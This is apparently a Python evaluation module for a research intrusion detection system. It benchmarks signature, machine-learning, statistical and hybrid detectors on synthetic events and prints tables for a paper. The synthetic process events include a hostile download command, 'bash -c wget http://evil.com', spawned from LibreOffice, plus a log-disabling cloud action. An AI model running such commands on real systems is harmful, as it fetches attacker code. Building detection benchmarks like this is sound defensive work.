from __future__ import annotations
"""
AHRAS Module 2 — Evaluation Framework
---------------------------------------
Benchmarks the hybrid detection engine against three baselines:

  Baseline A: Signature-only  (pure rule-based)
  Baseline B: ML-only         (Isolation Forest alone)
  Baseline C: Statistical-only (Z-score alone)
  AHRAS:      Hybrid combiner  (all three fused)

Metrics computed per run:
  - True Positive Rate (Recall / Detection Rate)
  - False Positive Rate
  - Precision
  - F1-score
  - Area Under ROC (AUC)
  - Mean detection latency (ms per event)

Output: a comparison table ready to paste into your paper's
evaluation section, plus per-class breakdown.

Usage:
  python -m detection.evaluator
  python -m detection.evaluator --classes network_activity file_activity
  python -m detection.evaluator --n-normal 500 --n-attack 100
"""

import os
import math
import sys
import time
import uuid
import logging
import argparse
import numpy as np
from datetime import datetime, timezone
from dataclasses import dataclass, field
from typing import Callable

log = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Metric container
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Metrics:
    tp: int = 0
    fp: int = 0
    tn: int = 0
    fn: int = 0
    latencies_ms: list = field(default_factory=list)

    @property
    def precision(self) -> float:
        return self.tp / max(self.tp + self.fp, 1)

    @property
    def recall(self) -> float:
        return self.tp / max(self.tp + self.fn, 1)

    @property
    def fpr(self) -> float:
        return self.fp / max(self.fp + self.tn, 1)

    @property
    def f1(self) -> float:
        p, r = self.precision, self.recall
        return 2 * p * r / max(p + r, 1e-9)

    @property
    def accuracy(self) -> float:
        total = self.tp + self.fp + self.tn + self.fn
        return (self.tp + self.tn) / max(total, 1)

    @property
    def mcc(self) -> float:
        """Matthews Correlation Coefficient — better metric for imbalanced datasets."""
        num   = self.tp * self.tn - self.fp * self.fn
        denom = math.sqrt(
            max((self.tp + self.fp) * (self.tp + self.fn)
                * (self.tn + self.fp) * (self.tn + self.fn), 1)
        )
        return num / denom

    @property
    def mean_latency_ms(self) -> float:
        return float(np.mean(self.latencies_ms)) if self.latencies_ms else 0.0

    @property
    def p99_latency_ms(self) -> float:
        return float(np.percentile(self.latencies_ms, 99)) if self.latencies_ms else 0.0

    def to_dict(self) -> dict:
        return {
            "tp": self.tp, "fp": self.fp, "tn": self.tn, "fn": self.fn,
            "precision":    round(self.precision, 4),
            "recall":       round(self.recall, 4),
            "fpr":          round(self.fpr, 4),
            "f1":           round(self.f1, 4),
            "mcc":          round(self.mcc, 4),
            "accuracy":     round(self.accuracy, 4),
            "mean_lat_ms":  round(self.mean_latency_ms, 2),
            "p99_lat_ms":   round(self.p99_latency_ms, 2),
            "n_total":      self.tp + self.fp + self.tn + self.fn,
        }


# ─────────────────────────────────────────────────────────────────────────────
# Event builders from feature vectors
# ─────────────────────────────────────────────────────────────────────────────

def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


def _eid() -> str:
    return str(uuid.uuid4())


def _build_ocsf_from_vector(ocsf_class: str, vec: np.ndarray, label: int) -> dict:
    """
    Reconstruct a minimal OCSF-normalized event from a feature vector.
    Used to feed synthetic labeled data through the full detection pipeline.
    """
    from normalizer.ocsf_normalizer import (
        _norm_network, _norm_process, _norm_file, _norm_cloud
    )

    if ocsf_class == "network_activity":
        # Feature 12 = log_unique_dst_ports, Feature 7 = log_packets
        u_ports = int(np.expm1(float(vec[12])) + 0.5)
        packets = int(np.expm1(float(vec[7])) + 0.5)
        flags   = ["SYN"] if label == 1 and u_ports > 20 else ["SYN", "ACK"]
        return _norm_network({
            "event_id": _eid(), "source": "network_tap", "timestamp": _ts(),
            "src_ip": "10.0.0.5", "dst_ip": "192.168.1.1",
            "src_port": 54321, "dst_port": 445 if label == 1 else 443,
            "protocol": "TCP",
            "packet_count": max(packets, 1),
            "byte_count":   max(int(np.expm1(float(vec[8]))), 60),
            "duration_sec": max(float(np.expm1(float(vec[9]))), 0.01),
            "tcp_flags":    flags,
            "unique_dst_ports": max(u_ports, 1),
        })

    if ocsf_class == "process_activity":
        suspicious = float(vec[7]) > 0.5
        return _norm_process({
            "event_id": _eid(), "source": "host_agent",
            "event_type": "process_spawn", "timestamp": _ts(),
            "hostname": "eval-host",
            "pid": 9999, "name": "bash" if suspicious else "sshd",
            "exe": "/bin/bash" if suspicious else "/usr/sbin/sshd",
            "cmdline": "bash -c wget http://evil.com" if suspicious else "sshd -D",
            "username": "root" if label == 1 else "user",
            "parent_pid": 1000,
            "parent_name": "libreoffice" if suspicious else "systemd",
        })

    if ocsf_class == "file_activity":
        entropy  = float(vec[0]) * 8.0
        high     = entropy > 7.2
        filepath = "/home/u/doc.pdf.enc" if label == 1 else "/home/u/report.docx"
        return _norm_file({
            "event_id": _eid(), "source": "host_agent",
            "event_type": "file_write", "timestamp": _ts(),
            "hostname": "eval-host", "filepath": filepath,
            "entropy": entropy, "high_entropy": high,
            "sha256": "aa" * 32 if high else "",
        })

    if ocsf_class == "cloud_api":
        high_priv = float(vec[1]) > 0.5
        action    = "cloudtrail:StopLogging" if label == 1 else "s3:GetObject"
        sev       = "critical" if label == 1 else "low"
        return _norm_cloud({
            "event_id": _eid(), "source": "cloud_adapter",
            "event_type": "cloud_api_call", "timestamp": _ts(),
            "provider": "aws", "action": action,
            "severity_hint": sev,
            "user_identity": "unknown-external" if label == 1 else "alice@corp.com",
            "source_ip": "45.33.32.156" if label == 1 else "10.0.0.1",
            "region": "us-east-1", "user_agent": "aws-cli",
            "request_parameters": {}, "error_code": None,
        })

    return {}


# ─────────────────────────────────────────────────────────────────────────────
# Baseline detectors
# ─────────────────────────────────────────────────────────────────────────────

def _run_signature_only(evt: dict) -> tuple[bool, float]:
    from detection.signature_engine.rules import run_signature_engine
    t0   = time.perf_counter()
    hits = run_signature_engine(evt)
    ms   = (time.perf_counter() - t0) * 1000
    return len(hits) > 0, ms


def _run_ml_only(ocsf_class: str, vec: np.ndarray) -> tuple[bool, float]:
    from detection.anomaly_engine.ml_engine import run_anomaly_engine
    t0     = time.perf_counter()
    result = run_anomaly_engine(ocsf_class, vec)
    ms     = (time.perf_counter() - t0) * 1000
    return result.is_anomaly and result.model_trained, ms


def _run_stat_only(evt: dict, vec: np.ndarray) -> tuple[bool, float]:
    from detection.statistical_engine.stat_engine import StatisticalEngine
    # Use a fresh engine per class to avoid cross-contamination
    engine = StatisticalEngine()
    # Warm up with 30 normal samples first
    from detection.dataset_generator import get_normal_vectors
    from detection.feature_extractor import extract
    cls = evt.get("ocsf_class", "network_activity")
    try:
        normals = get_normal_vectors(cls, n=30)
        dummy_evt = {"ocsf_class": cls, "src_endpoint": {"ip": "10.0.0.1"},
                     "traffic": {"packets": 10, "duration_sec": 1},
                     "actor": {"process": {}, "user": {"name": "u"}},
                     "api": {"operation": "s3:GetObject"},
                     "enrichment": {}, "device": {"hostname": "h"},
                     "dst_endpoint": {"ip": "10.0.0.2", "port": 443},
                     "file": {}, "cloud": {}}
        for nv in normals:
            engine.score({**dummy_evt, "ocsf_class": cls}, nv)
    except Exception:
        pass
    t0     = time.perf_counter()
    result = engine.score(evt, vec)
    ms     = (time.perf_counter() - t0) * 1000
    return result.is_anomaly, ms


# Shared combiner instance for evaluation (so baselines accumulate)
_eval_combiner = None

def get_hybrid_combiner():
    global _eval_combiner
    if _eval_combiner is None:
        from detection.hybrid_engine import HybridCombiner
        _eval_combiner = HybridCombiner()
    return _eval_combiner


def _run_hybrid(evt: dict) -> tuple[bool, float]:
    combiner = get_hybrid_combiner()
    t0       = time.perf_counter()
    result   = combiner.process(evt)
    ms       = (time.perf_counter() - t0) * 1000
    return (result.is_alert if result else False), ms


# ─────────────────────────────────────────────────────────────────────────────
# Per-class evaluation
# ─────────────────────────────────────────────────────────────────────────────

def evaluate_class(
        ocsf_class: str,
        n_normal:   int = 300,
        n_attack:   int = 100,
        verbose:    bool = True,
) -> dict[str, Metrics]:
    """
    Run all four detectors on a labeled synthetic dataset for one OCSF class.
    Returns a dict of detector_name → Metrics.
    """
    from detection.dataset_generator import generate_dataset, get_normal_vectors
    from detection.anomaly_engine.ml_engine import (
        bootstrap_with_normal_traffic, _detectors
    )
    from detection.feature_extractor import extract

    if verbose:
        print(f"\n{'─'*60}")
        print(f"  Evaluating: {ocsf_class}")
        print(f"  Normal={n_normal}  Attack={n_attack}")
        print(f"{'─'*60}")

    # Bootstrap ML with clean normal data (separate from test set)
    _detectors.pop(ocsf_class, None)
    bootstrap_normals = get_normal_vectors(ocsf_class, n=max(n_normal, 300))
    bootstrap_with_normal_traffic(ocsf_class, bootstrap_normals)

    # Generate test dataset
    X, y = generate_dataset(ocsf_class, n_normal=n_normal, n_attack=n_attack)

    results = {
        "signature_only":   Metrics(),
        "ml_only":          Metrics(),
        "statistical_only": Metrics(),
        "ahras_hybrid":     Metrics(),
    }

    # ── Pre-warm statistical engine with known-normal samples ─────────────────
    # Must use the SAME engine instance across all test events so baseline
    # accumulates correctly (fresh engine per event = no baseline = P=R=0).
    from detection.statistical_engine.stat_engine import StatisticalEngine
    stat_engine = StatisticalEngine()
    X_norm_only = X[y == 0]
    warmup_n    = min(len(X_norm_only), 60)
    for j in range(warmup_n):
        w_evt = _build_ocsf_from_vector(ocsf_class, X_norm_only[j], 0)
        if w_evt:
            stat_engine.score(w_evt, X_norm_only[j])

    # ── Per-event evaluation loop ─────────────────────────────────────────────
    hybrid_combiner = get_hybrid_combiner()

    for i in range(len(X)):
        vec   = X[i]
        label = int(y[i])
        evt   = _build_ocsf_from_vector(ocsf_class, vec, label)
        if not evt:
            continue

        # ── Signature only ────────────────────────────────────────────────────
        pred, ms = _run_signature_only(evt)
        m = results["signature_only"]
        m.latencies_ms.append(ms)
        if pred and label == 1:   m.tp += 1
        elif pred and label == 0: m.fp += 1
        elif not pred and label == 0: m.tn += 1
        else:                     m.fn += 1

        # ── ML only ───────────────────────────────────────────────────────────
        pred, ms = _run_ml_only(ocsf_class, vec)
        m = results["ml_only"]
        m.latencies_ms.append(ms)
        if pred and label == 1:   m.tp += 1
        elif pred and label == 0: m.fp += 1
        elif not pred and label == 0: m.tn += 1
        else:                     m.fn += 1

        # ── Statistical only (reuse warmed-up engine) ─────────────────────────
        t0 = time.perf_counter()
        s_result = stat_engine.score(evt, vec)
        s_ms = (time.perf_counter() - t0) * 1000
        pred = s_result.is_anomaly
        m = results["statistical_only"]
        m.latencies_ms.append(s_ms)
        if pred and label == 1:   m.tp += 1
        elif pred and label == 0: m.fp += 1
        elif not pred and label == 0: m.tn += 1
        else:                     m.fn += 1

        # ── Hybrid (reuse shared combiner) ────────────────────────────────────
        t0 = time.perf_counter()
        h_result = hybrid_combiner.process(evt)
        h_ms = (time.perf_counter() - t0) * 1000
        pred = h_result.is_alert if h_result else False
        m = results["ahras_hybrid"]
        m.latencies_ms.append(h_ms)
        if pred and label == 1:   m.tp += 1
        elif pred and label == 0: m.fp += 1
        elif not pred and label == 0: m.tn += 1
        else:                     m.fn += 1

    return results


# ─────────────────────────────────────────────────────────────────────────────
# Report printer
# ─────────────────────────────────────────────────────────────────────────────

def print_comparison_table(
        class_results: dict[str, dict[str, Metrics]]
) -> None:
    """
    Print a publication-ready comparison table to stdout.
    Format matches standard IDS evaluation papers.
    """
    detectors = ["signature_only", "ml_only", "ahras_hybrid"]
    labels    = {
        "signature_only":   "Signature-Only",
        "ml_only":          "ML-Only (IF)",
        "ahras_hybrid":     "AHRAS Hybrid ★",
    }

    print("\n" + "═" * 80)
    print("  AHRAS MODULE 2 — DETECTION PERFORMANCE COMPARISON")
    print("  (★ = proposed system)")
    print("═" * 80)

    for ocsf_class, det_metrics in class_results.items():
        print(f"\n  Class: {ocsf_class}")
        print(f"  {'Detector':<22} {'Precision':>10} {'Recall':>10} "
              f"{'F1':>8} {'FPR':>8} {'Lat(ms)':>10}")
        print(f"  {'─'*22} {'─'*10} {'─'*10} {'─'*8} {'─'*8} {'─'*10}")

        for det in detectors:
            m = det_metrics.get(det)
            if m is None:
                continue
            marker = " ★" if det == "ahras_hybrid" else "  "
            print(
                f"  {labels[det]+marker:<24} "
                f"{m.precision:>10.3f} "
                f"{m.recall:>10.3f} "
                f"{m.f1:>8.3f} "
                f"{m.fpr:>8.3f} "
                f"{m.mean_latency_ms:>10.2f}"
            )

    print("\n" + "═" * 80)
    print("  AGGREGATE (across all classes)")
    print("─" * 80)

    # Aggregate metrics across classes
    agg: dict[str, Metrics] = {d: Metrics() for d in detectors}
    for det_metrics in class_results.values():
        for det in detectors:
            m = det_metrics.get(det)
            if m is None:
                continue
            agg[det].tp += m.tp
            agg[det].fp += m.fp
            agg[det].tn += m.tn
            agg[det].fn += m.fn
            agg[det].latencies_ms.extend(m.latencies_ms)

    print(f"  {'Detector':<22} {'Precision':>10} {'Recall':>10} "
          f"{'F1':>8} {'FPR':>8} {'Lat(ms)':>10}")
    print(f"  {'─'*22} {'─'*10} {'─'*10} {'─'*8} {'─'*8} {'─'*10}")
    for det in detectors:
        m      = agg[det]
        marker = " ★" if det == "ahras_hybrid" else "  "
        print(
            f"  {labels[det]+marker:<24} "
            f"{m.precision:>10.3f} "
            f"{m.recall:>10.3f} "
            f"{m.f1:>8.3f} "
            f"{m.fpr:>8.3f} "
            f"{m.mean_latency_ms:>10.2f}"
        )

    print("═" * 80)
    print("  Metrics: Precision=TP/(TP+FP)  Recall=TP/(TP+FN)")
    print("           F1=2·P·R/(P+R)  FPR=FP/(FP+TN)  Lat=mean ms/event")
    print("═" * 80 + "\n")


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────


def export_latex_table(
        class_results: dict[str, dict[str, Metrics]],
        output_path: str = None,
) -> str:
    """
    Export comparison table as LaTeX (for direct paste into paper).
    Compatible with standard booktabs package.
    """
    detectors = ["signature_only", "ml_only", "statistical_only", "ahras_hybrid"]
    labels    = {
        "signature_only":   "Signature-Only",
        "ml_only":          "ML-Only (IF)",
        "statistical_only": "Statistical-Only",
        "ahras_hybrid":     r"\textbf{AHRAS Hybrid}",
    }

    lines = [
        r"\begin{table}[ht]",
        r"  \centering",
        r"  \caption{Detection Performance Comparison across OCSF Event Classes}",
        r"  \label{tab:detection-comparison}",
        r"  \begin{tabular}{llrrrrr}",
        r"  \toprule",
        r"  Class & Method & Precision & Recall & F1 & FPR & MCC \\",
        r"  \midrule",
    ]

    for cls_idx, (cls, det_metrics) in enumerate(class_results.items()):
        cls_label = cls.replace("_", r"\_")
        first = True
        for det in detectors:
            m = det_metrics.get(det)
            if m is None:
                continue
            bold = det == "ahras_hybrid"
            fmt  = lambda v: f"\\textbf{{{v:.3f}}}" if bold else f"{v:.3f}"
            row  = (
                f"  {cls_label if first else '':20s} & "
                f"{labels[det]:35s} & "
                f"{fmt(m.precision)} & {fmt(m.recall)} & "
                f"{fmt(m.f1)} & {fmt(m.fpr)} & {fmt(m.mcc)} \\\\"
            )
            lines.append(row)
            first = False
        if cls_idx < len(class_results) - 1:
            lines.append(r"  \midrule")

    lines += [
        r"  \bottomrule",
        r"  \end{tabular}",
        r"\end{table}",
    ]

    latex = "\n".join(lines)

    if output_path:
        with open(output_path, "w") as f:
            f.write(latex)
        print(f"  LaTeX table saved: {output_path}")

    return latex


def print_mitre_coverage() -> None:
    """Print MITRE ATT&CK technique coverage from all signature rules."""
    from detection.signature_engine.rules import RULE_REGISTRY
    tactics: dict[str, list] = {}
    for cls, rules in RULE_REGISTRY.items():
        import uuid as _uuid
        from datetime import datetime, timezone
        dummy = {"ocsf_class": cls, "src_endpoint": {"ip": "10.0.0.1", "port": 0},
                 "dst_endpoint": {"ip": "10.0.0.2", "port": 80},
                 "traffic": {"packets": 1, "bytes": 60, "duration_sec": 1},
                 "tcp_flags": [], "unique_dst_ports": 1, "protocol": "TCP",
                 "enrichment": {"abuse_score": 0, "is_private": True,
                                "is_threat_intel_hit": False, "is_high_risk": False,
                                "port_scan_indicator": False},
                 "actor": {"process": {"pid": 1, "name": "test", "exe": "/bin/test",
                                       "cmd_line": "test", "user": {"name": "user"}},
                           "user": {"name": "user"}},
                 "process": {"parent_pid": 0, "parent_name": "systemd"},
                 "file": {"path": "/tmp/test.txt", "sha256": ""},
                 "api": {"operation": "s3:GetObject", "error": None},
                 "cloud": {"provider": "aws", "region": "us-east-1"},
                 "device": {"hostname": "host"},
                 "event_id": str(_uuid.uuid4()),
                 "time": datetime.now(timezone.utc).isoformat(),
                 "severity_id": 1,
                 }
        for fn in rules:
            try:
                result = fn(dummy)
            except Exception:
                result = None
            import inspect, re
            src = inspect.getsource(fn)
            tactic_match    = re.search(r'mitre_tactic="([^"]+)"', src)
            technique_match = re.search(r'mitre_technique="([^"]+)"', src)
            if tactic_match and technique_match:
                tac = tactic_match.group(1)
                tec = technique_match.group(1)
                tactics.setdefault(tac, []).append(tec)

    print("\n  MITRE ATT&CK Coverage")
    print("  " + "─" * 50)
    for tactic, techniques in sorted(tactics.items()):
        print(f"  {tactic}")
        for t in sorted(set(techniques)):
            print(f"    • {t}")
    print(f"\n  Total tactics : {len(tactics)}")
    print(f"  Total techniques: {sum(len(v) for v in tactics.values())}")


def run_evaluation(
        classes:  list[str] = None,
        n_normal: int = 300,
        n_attack: int = 100,
) -> dict:
    """
    Run full evaluation. Returns nested dict of results.
    """
    if classes is None:
        classes = [
            "network_activity",
            "process_activity",
            "file_activity",
            "cloud_api",
        ]

    all_results = {}
    for cls in classes:
        try:
            all_results[cls] = evaluate_class(
                cls, n_normal=n_normal, n_attack=n_attack
            )
        except Exception as e:
            log.error(f"[EVAL] Failed for {cls}: {e}", exc_info=True)

    print_comparison_table(all_results)
    return all_results


if __name__ == "__main__":
    logging.basicConfig(
        level=logging.WARNING,
        format="%(asctime)s [%(name)s] %(message)s"
    )

    import os, sys
    os.environ.setdefault("AHRAS_DEV_MODE",  "true")
    os.environ.setdefault("AHRAS_MODEL_DIR", "/tmp/ahras_models")
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

    parser = argparse.ArgumentParser(description="AHRAS Module 2 Evaluator")
    parser.add_argument("--classes", nargs="+",
                        default=["network_activity","file_activity","cloud_api"],
                        help="OCSF classes to evaluate")
    parser.add_argument("--n-normal", type=int, default=300)
    parser.add_argument("--n-attack", type=int, default=100)
    args = parser.parse_args()

    run_evaluation(
        classes=args.classes,
        n_normal=args.n_normal,
        n_attack=args.n_attack,
    )
